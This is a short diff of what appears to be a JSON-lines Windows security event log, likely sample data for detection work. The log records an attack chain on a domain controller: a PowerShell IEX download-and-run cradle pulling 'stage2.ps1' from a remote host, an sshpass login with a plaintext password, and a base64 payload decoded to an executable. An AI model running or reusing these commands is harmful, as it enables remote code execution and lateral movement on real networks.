@@ -10,3 +10,4 @@
 {"TimeCreated": "2026-11-08T14:04:05Z", "EventID": 4104, "Computer": "WIN-CORP-DC01", "TargetUserName": "svc_payroll", "ScriptBlockText": "IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.100.45:8000/stage2.ps1'))"}
 {"TimeCreated": "2026-11-08T14:05:30Z", "EventID": 4688, "Computer": "WIN-CORP-DC01", "TargetUserName": "svc_payroll", "NewProcessName": "C:\\Tools\\sshpass.exe", "CommandLine": "sshpass -p P@ssword123 ssh admin@10.200.1.10", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}
 {"TimeCreated": "2026-11-08T14:06:10Z", "EventID": 4688, "Computer": "WIN-CORP-DC01", "TargetUserName": "svc_payroll", "NewProcessName": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c base64 -d payload.b64 > run.exe", "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}
+
